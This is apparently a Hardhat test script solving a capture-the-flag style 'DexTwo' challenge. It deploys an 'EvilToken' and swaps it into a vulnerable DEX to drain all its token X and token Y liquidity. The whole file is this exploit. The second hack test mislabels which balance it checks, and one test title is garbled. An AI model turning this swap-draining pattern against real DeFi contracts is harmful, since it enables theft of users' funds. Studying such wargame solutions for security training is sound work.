const { assert, expect } = require("chai")
const { deployments, getNamedAccounts, ethers } = require("hardhat")
const { deploy } = deployments

describe("Dex Test", () => {
    let dex, deployer, hacker, tokenX, tokenY, tokenHack, pwn

    before(async () => {
        const accounts = await ethers.getSigners()
        deployer = accounts[0]
        hacker = accounts[1]

        await deploy("DexTwo", {
            from: deployer.address,
            args: [],
        })

        const dexContract = await ethers.getContract("DexTwo")
        dex = dexContract.connect(deployer)

        //Deploying the hack token

        await deploy("EvilToken", {
            from: deployer.address,
            args: ["400"],
        })
        //PWN

        pwn = await ethers.getContract("EvilToken")
        console.log(pwn.address)

        //Initializing the pwn contract to withdraw all the funds

        await pwn.approve(dex.address, "400")
        await pwn.transfer(dex.address, "100")

        tokenX = await deploy("SwappableTokenTwo", {
            from: deployer.address,
            args: [dex.address, "Xe", "X", "110"],
        })
        tokenY = await deploy("SwappableTokenTwo", {
            from: deployer.address,
            args: [dex.address, "Ye", "Y", "110"],
        })

        await dex.setTokens(tokenX.address, tokenY.address)
        await dex.approve(dex.address, "1000")
        await dex.add_liquidity(tokenX.address, "100")
        await dex.add_liquidity(tokenY.address, "100")
    })
    describe("Let's Check the initiated things  ", () => {
        it("Checks the balance of token X and token Y in contract", async () => {
            const balOfX = await dex.balanceOf(tokenX.address, dex.address)
            const balOfY = await dex.balanceOf(tokenY.address, dex.address)
            const balOfDex = await dex.balanceOf(pwn.address, dex.address)
            assert.equal(balOfX.toString(), "100")
            assert.equal(balOfY.toString(), "100")
            assert.equal(balOfDex.toString(), "100")
        })
        it("Checks the player has 10 Tokens (Taking deployer as the player)", async () => {
            const balOfX = await dex.balanceOf(tokenX.address, deployer.address)

            const balOfY = await dex.balanceOf(tokenY.address, deployer.address)
            assert.equal(balOfX.toString(), "10")
            assert.equal(balOfY.toString(), "10")
        })
    })
    describe("Let's Hack it", async () => {
        it("Let's the balance of X to )", async () => {
            
            await dex.swap(pwn.address,tokenX.address,"100")
            const balanceOfX = await dex.balanceOf(tokenX.address, dex.address)
            assert.equal(balanceOfX.toString(),"0")
        })
        it("Let's bring balance of tokenY to 0",async ()=>{
            await dex.swap(pwn.address,tokenY.address,"200")
            const balanceOfY = await dex.balanceOf(tokenX.address, dex.address)
            assert.equal(balanceOfY.toString(), "0")
        })
    })
})
